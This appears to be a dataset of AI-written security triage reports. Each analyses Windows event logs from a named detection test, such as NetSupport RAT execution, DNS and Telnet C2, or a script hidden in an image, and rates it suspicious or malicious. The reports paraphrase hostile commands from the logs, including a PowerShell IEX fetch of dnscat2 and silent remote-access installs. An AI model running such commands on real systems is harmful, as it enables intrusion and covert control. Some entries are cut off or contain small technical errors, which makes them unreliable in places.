5. **Security Policy**: Reinforce security settings to prevent unauthorized proxy setups, especially focusing on restricting high-integrity processes from unauthorized users."

This indicates execution of a batch file from a temporary location. The use of temp directories for execution is a common technique in malicious operations for transient or staging purposes.
   
4. **Process Tree:**
    - The execution of processes like `whoami.exe` and `hostname.exe` may suggest an attempt to gather system information, possibly for reconnaissance purposes. These processes are executed under the context of `SERVER002\admin_test`, indicating actions performed by an admin-like account.
    - Process ID and GUID tagging show a hierarchy where such utility commands originate from `wsmprovhost.exe` which is a legitimate Windows Management Instrumentation (WMI) host process, but it's important to validate the context of these executions.

5. **Log Events:**
    - Edge Update service stopping at the same time as these events is likely part of regular update cycles, but any deviation should be inspected.
    - Windows Defender appears to be active as indicated by its status logs, providing some level of security assurance.

### Assessment:
The log indicates a mix of routine update activities interspersed with some potentially suspicious actions such as direct execution from temporary directories and frequent system commands invoking utilities like `wevtutil.exe`, `whoami.exe`, and `hostname.exe`. It's important to ensure these were authorized and part of a planned operation.

### Conclusion:
**Resolution: SUSPICIOUS**
- The presence of potentially legitimate activities with some unusual executions requires further investigation. This includes verifying if the `admin_test` account has been used appropriately and if the batch file execution from the temp directory holds any significance.
  
### Guidance:
- **Further Investigation:** Review context and recent activities around `admin_test`. Validate if users or automated scripts were scheduled to run these commands.
- **Cross-Verification:** Check additional logs that might not have been included (especially Security logs) for any unauthorized accesses or failed attempts.
- **Harden Systems:** Monitor and restrict execution from temporary folders. Implement tighter control on administrative level scripts or tasks.
- **Assess Update Packages:** Ensure Microsoft Edge updates are legitimate and verify their integrity with checksums for the executable files from known sources.

Itâ€™s advisable to closely monitor these activities and corroborate them with any user reports or system changes on the CEO machine to ensure there's no ongoing compromise."
NetSupport - RAT Execution,"**Analysis and Findings:**

Upon reviewing the provided logs, several entries warrant further investigation due to their nature and timeline:

1. **Usage of `wevtutil.exe`:** 
   - The execution of `C:\Windows\System32\wevtutil.exe` repeatedly by the user `SERVER002\admin_test` within a short timeframe is suspicious. This behavior can be indicative of an attempt to clear or export event logs, potentially to cover tracks or gather log information.
   
2. **Installation Attempt of NetSupport Manager:**
   - Logs show a PowerShell command executing `data_NetSupport.exe` using silent parameters (`/S /v/qn`). This operation appears to install NetSupport Manager without any evident user interaction, as captured through the `Start-Process` command in PowerShell. NetSupport Manager could be used legitimately for remote support, but silent installation attempts could imply unauthorized usage.

3. **Failed Installation Events:**
   - Multiple `MsiInstaller` events indicate the failure of the NetSupport Manager installation. This kind of failure, coupled with the attempted silent installation method, increases the suspicion.

4. **High Integrity Level Processes:**
   - Many of the processes were launched with a high integrity level, which might indicate processes are running with elevated privileges, questioning the legitimacy of the purpose for such executions by the user `SERVER002\admin_test`.

5. **Console Commands:**
   - The execution of `whoami.exe` and `hostname.exe` by `SERVER002\admin_test` are standard commands for obtaining system and user information, which are frequently used in reconnaissance phases of an attack.
   
6. **Microsoft Edge Update Events:**
   - Several entries involve the `MicrosoftEdgeUpdate.exe` process running commands related to service updates or installations. These entries align with known update mechanisms, although their presence in proximity to other suspicious activity should not be ignored.

**Assessment:**
While the execution of known Windows utilities and updaters like `wevtutil.exe`, `whoami.exe`, or MicrosoftEdgeUpdate processes may not inherently be malicious on their own, their combined pattern of usage, especially with the silent installation attempt of a remote management tool like NetSupport Manager, raises red flags for potential nefarious usage or attempts to install remote management software without proper authorization.

**Resolution:**
Given the logs provided, the aforementioned activities collectively indicate that this incident fits under the resolution of **SUSPICIOUS**. The activities observed require further in-depth investigation to ascertain the intent and potential risk level to the organization, and possibly trigger actions for ensuring security posture like isolating the system, checking for unauthorized software installations, and reviewing user activity history for `SERVER002\admin_test`."
RustDesk Files Detected Test on Windows,"After a comprehensive analysis of the provided logs from the Windows host, several activities arouse concern, particularly involving the `admin_test` user account and the use of PowerShell:

1. **PowerShell Execution and File Download**:
   - The logs indicate that PowerShell was used to download and execute a file named `rustdesk-1.2.3-1-x86_64.exe` from an external URL hosted on GitHub (`https://github.com/rustdesk/rustdesk/releases/download/1.2.3-1/rustdesk-1.2.3-1-x86_64.exe`). The PowerShell command includes `Invoke-WebRequest` to download the file and `Start-Process` to execute it with `/S`, which typically signifies a silent installation.
   - This kind of behavior is often associated with unauthorized installations or potential deployment of malware if not verified as legitimate. RustDesk is known software, but deploying it through PowerShell could indicate a misuse.

2. **Unrecognized Application Execution**:
   - Subsequently, the executable `rustdesk-1.2.3-1-x86_64.exe` set off from the desktop location. RustDesk operates as remote desktop control software which, if unapproved, could lead to unauthorized remote access.

3. **Process Execution**:
   - The executable launches additional processes, including `taskkill`, which is used to forcefully stop processes (`RuntimeBroker_rustdesk.exe`), and another instance of `rustdesk.exe` located in `C:\Users\admin_test\AppData\Local\rustdesk`.

4. **Elevated Privileges and Administrative Activities**:
   - The `admin_test` account exhibits high integrity levels and utilizes command-line tools with potential administrative privileges. It accesses system32 executables, indicating elevated permissions.

5. **Sysmon and Event Logs Correlation**:
   - Sysmon logs capture sequences where `conhost.exe`, `whoami.exe`, and other built-in utilities were executed under the `admin_test` account. While these are not inherently malicious, coupled with the context of the above activity, they suggest system reconnaissance or further activity by an operator leveraging admin rights.

6. **Security Logs**:
   - Multiple authentication and privilege escalation events (`EventID 4672`) were noted, but these align with typical system or software update patterns except in the context of unauthorized software deployment.

### Assessment

Based on the observations, the activity involving PowerShell to download and install software, specifically RustDesk, without clear authorization is **anomalous**. Given the potential for this to be legitimate activity gone rogue or malicious impersonation, it triggers strong suspicion due to its execution style and potential misuse for remote access.

### Resolution: SUSPICIOUS

**Guidance**:
- Verify whether the installation of RustDesk was sanctioned. Confirm with system administrators or the involved user (`admin_test`) regarding the purpose of the installation.
- Conduct a review of remote access activity to assess if unauthorized remote sessions were established.
- Check network logs for any unusual outbound connections or data transfer surrounding the time of the PowerShell command execution.
- Increase monitoring of the `admin_test` account for further unusual activities.
- Consider isolating the system if confirmation of unauthorized access or compromise is evident, and conduct a thorough security audit to ensure no further threats persist.

Ensure engagement with the appropriate internal security and IT teams to address potential misconfigurations or policy violations."
Embedded Script in Image Execution via Extract-Invoke-PSImage,"**Analysis of Logs:**

1. **Windows Defender Status:**
   - The application log shows that Windows Defender is active (`SECURITY_PRODUCT_STATE_ON`), which is good for the host's security posture. However, the necessity of reviewing additional suspicious activities remains.

2. **PowerShell Activity:**
   - Several events from the PowerShell logs indicate the execution of a specific PowerShell script using `Extract-Invoke-PSImage.ps1`. This script appears to extract data from an image file (`evil_kitten.jpg`) which is highly suspicious.
   - The use of Base64 encoding/decoding and script execution from extracted content (`textExtraction.ps1`) is indicative of potentially obfuscated malicious activity.
   - The PowerShell command is executed with high privileges (IntegrityLevel: High), which could be exploited for unauthorized actions.

3. **Sysmon Logs:**
   - The Sysmon logs illustrate the execution of a PowerShell process (`powershell.exe`) initiated by `wsmprovhost.exe`. This parent-child relationship, combined with the PowerShell script mentioned, raises concerns about potentially malicious remote command execution.
   - Additionally, the process `wevtutil.exe` is frequently called during this event window, suggesting possible attempts to manipulate Windows Event Logs or analyze system events, which can be a strategy employed by threat actors to hide activity.
   - Invocation of tools like `whoami.exe` and `hostname.exe` suggests attempts to gather information about the system and the privileges of the running user, respectively.

**Assessment:**
- There are strong indicators of malicious behavior in these logs. The use of a PowerShell script to decode and execute possibly hidden or obfuscated content is particularly telling, especially with a file named `evil_kitten.jpg`, suggesting concealment of code within images.
- The frequent use of `wevtutil.exe` and PowerShell scripts in conjunction with base64 encoded content is suspicious of an effort to execute unauthorized commands or maintain persistence while attempting to clear or analyze logs for signs of detection.
  
**Resolution: MALICIOUS**

**Guidance on How to Proceed:**

Malicious User Agents - CMD,"### Detailed Analysis of the Windows Event Logs

#### Overview
Upon reviewing the provided logs, the activities that stand out significantly involve both expected software updates and potentially suspicious command executions. The logs show a series of events mostly related to Microsoft Edge Update and some use of command-line utilities that warrant further attention.

#### Key Observations:

1. **Microsoft Edge Update Activity:**
   - Repeated execution of `MicrosoftEdgeUpdate.exe` and related executables such as `MicrosoftEdgeUpdateComRegisterShell64.exe` is logged under the `NT AUTHORITY\SYSTEM`. This is generally observed as part of Microsoft's automatic update processes for applications like Edge and is standard behavior in many enterprise environments.
   - The hash values associated with these executable files (such as `4BF5A07C3801A248B6C38715F733E0264A04F7A95038006FD346D454D4ECC07C`) should be verified against known good hashes for additional verification of their integrity.

2. **PowerShell Usage:**
   - `powershell.exe` was executed by user `SERVER002\admin_test`. PowerShell is a powerful scripting tool and, if used for administrative purposes, can be benign. However, if used in combination with other anomalies or suspicious events, it might indicate malicious intent.

3. **wevtutil and conhost Execution:**
   - Repeated occurrences of `wevtutil.exe` and `conhost.exe` running under the `admin_test` account could indicate manipulation or clearing of event logs, which is a tactic often used to cover tracks after malicious activities. The rationale behind these executions needs further investigation.

4. **Use of Curl and Cmd Execution:**
   - The parallel execution of `curl.exe` to various websites using different User Agents (seen under the process command `cmd.exe`) is unusual and potentially indicative of scripted browsing or data exfiltration events. The use of curl in this context is uncommon in regular operations without a clear operational purpose.

5. **Observed Commands in CMD:**
   - The command sequence using CMD to execute a series of `curl` requests to `www.google.com` with unusual User Agent strings (`""HttpBrowser/1.0""`, `""Wget/1.9+cvs-stable""`, `""Opera/8.81""`, `""*<|>*""`) indicates an attempt to probe network connectivity in a manner atypical of standard operations.

#### Assessment and Resolution:

- **Assessment:**
  - The Microsoft Edge Update activity appears to be benign unless further investigation into the hash values reveals discrepancies.
  - The persistent execution of `powershell.exe`, `wevtutil.exe`, `conhost.exe`, and the curiously crafted `curl` commands directly point to potential probing or lateral movement activities within the network, possibly indicative of a script designed for network enumeration or exploitation.

- **Resolution: SUSPICIOUS**
  - Given the execution of command-line utilities with parameters that could indicate reconnaissance or prelude to more significant malicious activity, this warrants further investigation.
  - The execution context (`admin_test` user) and actions (such as the power use of wevtutil) suggest examining the account's recent activities, ensuring password changes, and verifying if the account was compromised.

#### Guidance on Further Steps:

1. **Extended Audit and Alert Monitoring:**
   - Increase the audit log retention for the admin_test account, focusing on privilege escalations or unusual login attempts.
   - Monitor for further execution of command-line tools or scripts not aligned with typical administrative tasks.

2. **Review and Lockdown:**
   - Immediately review and possibly isolate the machine until further threat hunting is complete to prevent further spread.
   - Verify integrity of all running processes and executable files with updated threat intelligence.

3. **Investigate Account Use:**
   - Review the history and permissions associated with the `admin_test` account, ensuring it aligns with an expected administrative role.
   - Conduct a review of administrative actions for hard-to-identify trails of lateral movement.

By further investigating and validating these observations, we can confirm if suspicious behaviors were indeed malicious or identify them as false positives in the context of this organization's environment."
Windows - PowerShell Download,"Upon analyzing the provided logs, here are the findings:

### Analysis:
1. **PowerShell Activity**:
   - There are multiple entries in the PowerShell logs indicating the use of PowerShell to download a file from a URL: `https://raw.githubusercontent.com/file/file-file/master/LICENSE.txt` to the local TEMP directory. The use of PowerShell to download files from external URLs is a commonly used tactic in malicious activities, as it can indicate an attempt by a threat actor to download a script or payload.
   
2. **Sysmon Events**:
   - Numerous Sysmon logs show different processes started with high integrity, which indicates they might have been executed with elevated privileges.
   - Processes `wevtutil.exe` and `conhost.exe` are frequently appearing, executed by user `SERVER002\\admin_test`. The utility `wevtutil.exe` is used for managing event logs and could potentially be used for log manipulation.
   - Regular system operations for `Microsoft Edge Update` are observed, which generally follow a legitimate and benign update pattern from Microsoft.

3. **System Integrity**:
   - All logged processes originate from legitimate applications and directories, such as `C:\\Program Files (x86)\\Microsoft\\EdgeUpdate`, `C:\\Windows\\System32\\`.
   - Interestingly, several instances of `MicrosoftEdgeUpdate` and related fill seem to have benign interactions, consistent with standard software update operations.
   
4. **Observed Processes**:
   - Processes such as `whoami.exe` and `hostname.exe` display typical information gathering often used by adversaries to understand system configuration and user context if executed by suspicious actors.

### Conclusion:
The most concerning activity is the PowerShell script execution that downloads a file over the internet. While the specific file appears to be a text document, the method used is synonymous with various malicious campaigns. However, the logs do not directly indicate what action was taken with the downloaded file, leaving uncertainty about subsequent activities and their intent.

### Resolution:
- **SUSPICIOUS** - The PowerShell activity combined with privilege levels and process execution patterns are not typical for routine administrative tasks, especially on a sensitive role such as the CEO's machine. Further investigation is warranted to analyze the exact content and purpose of the downloaded file, and whether it links to malicious activity, along with verifying the legitimacy of the commands executed by `admin_test`.

### Guidance:
1. **Immediate Actions**:
   - Investigate the URL being accessed to understand the nature of the content it hosts.
   - Inspect the downloaded file, `$env:TEMP\\file-license.txt`, to ensure it isn't being used for any malicious purpose.
   - Verify if `admin_test` has approved administrative activity or any unusual user behavior.

2. **Recommendations**:
   - Enhance monitoring of PowerShell script execution and consider blocking potentially harmful commands or scripts.
   - Correlate this event with other network activity logs to ascertain if any other suspicious connections or downloads have occurred.

DNS over HTTPS Long Domain Query,"### Analysis of Logs

1. **Windows Event Logs Overview:**
   - **Security Log (EventID: 4616):** Time change events initiated by the svchost.exe process running under the LOCAL SERVICE account.
   - **System Log:** Various kernel and time service events, which primarily indicate standard operations like time changes and time synchronization with an NTP server.
   - **Sysmon Log:**
     - Multiple `wevtutil.exe` and `conhost.exe` processes execution under the user `SERVER002\admin_test`.
     - A PowerShell execution with a script, which seems not standard due to querying some `xip.io` domain.
   - **Application Log:** Indication of the EdgeUpdate service stopping.
   - **Windows PowerShell Log:** Execution of a PowerShell script with command-line arguments pointing to potential misuse or automation-related processes involving DNS over HTTPS.

2. **Suspicious or Anomalous Behavior:**
   - **PowerShell Execution:** The PowerShell activity is highly suspicious. The command attempts to execute a script `data-doh-domain-length.ps1` with parameters indicating a DNS over HTTPS (DoH) request to a well-known DoH server at Google (`8.8.8.8`) and a domain-ending in `xip.io`, which can be used to map IP addresses in DNS queries.
   - **Use of `wevtutil.exe`:** This utility is used to query and manage event logs. Its frequent execution in a short period, especially with the account `admin_test`, could indicate an attempt to tamper with logs or automate log querying, which might be benign but raises suspicion.

3. **Identified Threats or Risks:**
   - **Potential Command and Control or Data Exfiltration Risks:** The PowerShell script execution with DoH queries suggests potential command and control (C2) or data exfiltration, which can bypass traditional DNS monitoring.
   - **Possibility of Log Manipulation:** Given the repeated execution of `wevtutil.exe`, it is prudent to consider possible log manipulation or investigative activity that is not typical for ordinary operations.

### Assessment and Resolution

- **Resolution:** **SUSPICIOUS**
  - The activity involving PowerShell and the DoH script presents an anomaly that doesn't fit normal operational patterns.
  - Although there is no direct evidence of compromise (e.g., malicious file hashes, known attack patterns, etc.), the behavior requires further investigation to confirm or refute the presence of malicious activity.

### Guidance on How to Proceed

1. **Immediate Actions:**
   - **Isolate the Host:** To prevent any potential communication from ongoing or undetected threats.
   - **Terminate the PowerShell Process:** As a precautionary measure.

2. **Investigation and Monitoring:**
   - **Deep Dive into PowerShell Activity:** Analyze the script referred to (`data-doh-domain-length.ps1`) to understand its function and look for any other scheduled tasks or scripts that may have been modified or created.
   - **Review Log Integrity:** Check for signs of log tampering or deletion and confirm authentic and complete log records.
   - **Monitor Network Traffic:** Focus on DNS and HTTP/S traffic for unusual patterns or data exfiltration attempts.
   - **User Account Audit:** Verify activities under the `admin_test` account and look for any unauthorized access or privilege escalation attempts.

3. **Report and Communicate:**
   - Prepare a detailed report of findings and notify relevant stakeholders, including IT security teams, about the potential threat and the steps being taken to mitigate it."
DNS C2,"Based on the analysis of the provided logs, there are several indicators of potentially malicious activity observed:

**Key Findings:**

1. **PowerShell Activity:**
   - There are multiple events indicating the execution of PowerShell scripts. The command contained in the logs indicates the use of `IEX` (Invoke-Expression) to execute a script downloaded from `https://raw.githubusercontent.com/.../dnscat2.ps1`. This script is related to `dnscat2`, a known tool for creating DNS tunnels commonly used in data exfiltration and covert command and control. The use of obfuscated or encoded scripts like this often indicates malicious intent.

2. **Unusual Command Line Activity:**
   - Sysmon logs show the execution of various processes such as `nslookup.exe`, `whoami.exe`, and `hostname.exe` from directories typically utilized by administrators or scripts with elevated privileges. While these on their own may not be malicious, their repeated and scripted execution suggests that they might be part of a reconnaissance or lateral movement strategy.
   - The use of `wevtutil.exe` indicates possible manipulation or clearing of event logs, which can be a tactic used to cover tracks after unauthorized operations.

3. **Unexpected Process Executions:**
   - The Sysmon logs reflect many instances of processes executed under `NT AUTHORITY\SYSTEM`. This level of execution might be normal, but it's important to identify if these processes were expected as part of regular operations or indicate a compromise.
   - The execution of `MicrosoftEdgeUpdate.exe` with various command-line flags repeatedly is unusual in its frequency and the context of other observed activities. This could indicate misuse of the update process for persistence or lateral movement.

**Assessment:**

The logs contain significant evidence of potentially malicious activity. The use of PowerShell to download and execute remote scripts, particularly those related to tools like `dnscat2`, stands out as a prominent indicator of compromise. Additionally, the combination of unusual command use and process execution reinforces the suspicion of unauthorized activity.

**Resolution:** MALICIOUS

**Guidance on how to proceed:**

Telnet C2,"Upon analyzing the provided Windows event logs, the following observations and assessments were made:

### Analysis of Suspicious or Anomalous Behavior:

1. **PowerShell Execution:**
   - **EventID 600** and **EventID 400** in the Windows PowerShell logs indicate the execution of a PowerShell instance with the command to run `telnet_client.exe` on localhost 127.0.0.1 through port 23. This is anomalous for a few reasons:
     - Telnet is an outdated and insecure protocol, and running a client in this manner, especially without documented administrative knowledge, could suggest an attempt at establishing a local backdoor or unauthorized access.
     - The execution path points to `C:\Users\ADMIN_~1\AppData\Local\Temp\file\data\bin\`, which is unusual as legitimate executables should not generally run from temporary directories.
   
2. **Process Creation and Chain:**
   - The Sysmon log shows multiple instances of process creation for `powershell.exe`, `conhost.exe`, and `wevtutil.exe` under the user `SERVER002\admin_test`. Using PowerShell in combination with processes like `wevtutil`â€”which can read event logsâ€”might suggest an attempt to gather information or manipulate log data.
   - The multiple `wevtutil.exe` and `conhost.exe` executions aligned with the PowerShell events are potentially suspicious as they suggest simultaneous operations potentially coordinated by a script.

3. **EdgeUpdate Anomalies:**
   - There is a significant amount of activity regarding `MicrosoftEdgeUpdate.exe`, residing in temporary directories, invoking various command line parameters. While this could be related to legitimate software updates, the extensive activity and redundant operations, particularly those in **Sysmon EventIDs** from `18000` to `18026`, can merit further investigation.
   - The execution from a temporary directory `C:\Program Files (x86)\Microsoft\Temp\` instead of a standard installation directory is suspicious.

### Assessment:

- **Potential Indicators of Compromise:**
  - Anomalous execution of `telnet_client.exe` through PowerShell from a temporary directory.
  - Usage of `wevtutil.exe` in an orchestrated manner potentially for log manipulation.
  - Unusual activity of `MicrosoftEdgeUpdate.exe`, specially sourced from temporary directories which raises suspicion of either a false positive in update processes or a possible compromise.

### Recommendations:

- **Immediate Actions:**
  - Isolate the affected host for an in-depth forensic investigation to ensure comprehensive threat detection.
  - Investigate the source and integrity of `telnet_client.exe`, including how it was placed in the system and potential external connections.
  - Review recent user activities and access logs to identify any unauthorized access or usage patterns.
  
- **Further Analysis:**
  - Conduct a comprehensive malware scan and network analysis to identify potential breaches.
  - Verify the authenticity of updates and executables, particularly for Edge, to safeguard against potential tampering or malicious distribution.

### Resolution:

Given the findings, the logs contain behavior and patterns that strongly suggest suspicious activities potentially leading to malicious actions. Therefore, the situation is assessed as:

- **SUSPICIOUS:**
  - This activity requires further investigation to rule out or confirm a compromise and ascertain the impact and scope of any identified threat."
Malicious User Agents - Powershell,"## Analysis

### Indicators of Potential Malicious Activity

1. **Unusual PowerShell Execution**:
   - The PowerShell logs indicate multiple ""Invoke-WebRequest"" commands to ""www.google.com"" with various user agents such as ""HttpBrowser/1.0"", ""Wget/1.9+cvs-stable"", ""Opera/8.81"", and ""*<|>*"". 
   - This script seems crafted to disguise web requests using different user agents. Although this specific action in isolation might not be directly harmful, it could indicate recon activity or checking for open access routes through a firewall.

2. **Frequent Process Executions**:
   - Several entries in the Sysmon logs show the execution of standard Windows binaries, such as `wevtutil.exe`, `conhost.exe`, `hostname.exe`, `whoami.exe`, and `powershell.exe`, within a suspiciously close timeframe.
   - Process spawning patterns like these are often seen during toolkits or scripts execution for malicious intent.

3. **Edge Installer Execution**:
   - Multiple executions of ""EDGEMITMP_A4A59.tmp\setup.exe"" under the Microsoft Edge update path. Still, the setup.exe's parent-child relationship shows consistency with standard browser updates. However, the volume and timing of these executions warrant scrutiny to ensure no tampering with the update mechanism.

### Assessment

- The PowerShell activity is abnormal, and using web requests with multiple user agents suggests it could be reconnaissance or testing perimeter defenses.
- Multiple instances of Windows service binaries and administrative tools might be benign if associated with a legitimate script or operation but are often seen in penetration testing frameworks or post-exploitation activities.
- Edge Update executions usually align with regular browser updates if confirmed via software deployment logs.

### Risk and Threats Identified

- **Risk**: Reconnaissance activity could be occurring, trying to map the network or open paths through firewalls.
- **Threat**: Potential post-exploitation activity due to the nature of the process executions and rapid spawning of native binaries within a short time.

### Guidance

1. Perform a deeper investigation into the PowerShell scripts. Identify if these scripts were legitimately executed by an admin operation or if they could be scripts left by an adversary.
2. Verify and cross-reference the timestamp of the Windows processes with update schedules and user interaction to confirm their legitimacy.
3. Consider implementing stricter PowerShell logging or execution policies to alert on similar suspicious command executions in the future.
4. Monitor network activity for unusual outbound traffic that may indicate data exfiltration or command and control communications.

## Resolution: **SUSPICIOUS**
The behavior observed in the logs suggests activities that do not align with normal operations and can potentially be malicious, warranting further investigation."
File Download via PowerShell,"After examining the provided event logs from the Windows host machine ""Server002"", here is a detailed analysis of the findings:

### Anomalous Entries:

1. **PowerShell Activity:** 
   - There are multiple PowerShell events (Log ID: 600 and 400) which indicate the execution of a PowerShell script. The script is fetching a text file from a GitHub URL: `https://raw.githubusercontent.com/file/file-file/4042cb3433bce024e304500dcfe3c5590571573a/LICENSE.txt` and saving it to `LICENSE.txt`.
   - While downloading content from GitHub could be benign, it is often used by attackers to fetch scripts or execute malicious payloads.

2. **Time Change Events:**
   - The security log (EventID 4616) and system log (EventID 1) show changes in system time executed by the `svchost.exe` process. Changing system time is typically not common and can be indicative of an attempt to manipulate logs or disrupt security mechanisms reliant on time stamps.

3. **Use of Sysmon to Track Processes:**
   - Sysmon logs detail the execution of commands such as `whoami`, `hostname`, and `wevtutil`. While these utilities themselves are standard, the concentration and timing with PowerShell activities can be suspicious.

### Potential Indicators of Compromise:

- **PowerShell Execution:** The manner in which PowerShell is used to download and possibly execute a file without further descriptive context is a flag for potential compromise. Attackers can use such scripts to download and initiate malicious activities or to establish further persistence or communication with command and control servers.

- **Time Manipulation:** The alteration of system time in multiple events in quick succession, especially by a process like `svchost.exe`, raises questions. Although `svchost.exe` is legitimate, it is often abused by malicious software due to its critical roles in Windows operations.

### Risk Assessment:

- The PowerShell activity indicates a high level of risk as it suggests the potential downloading of unknown content which could mask additional payloads or malicious scripts intended to compromise the system.
- The rapid time changes could disrupt logging or security measures, which might be part of an attack strategy.

### Conclusion and Recommendation:

**Resolution: SUSPICIOUS**

- **Further Investigation Required:** The observed activity is suspicious and warrants further investigation. This includes:
  - Verification of the legitimacy of the downloaded file and its contents.
  - Conducting a thorough scan of the system for known malware signatures and anomalies.
  - Auditing system accounts, and ensuring no unauthorized accounts or privileges are being used.
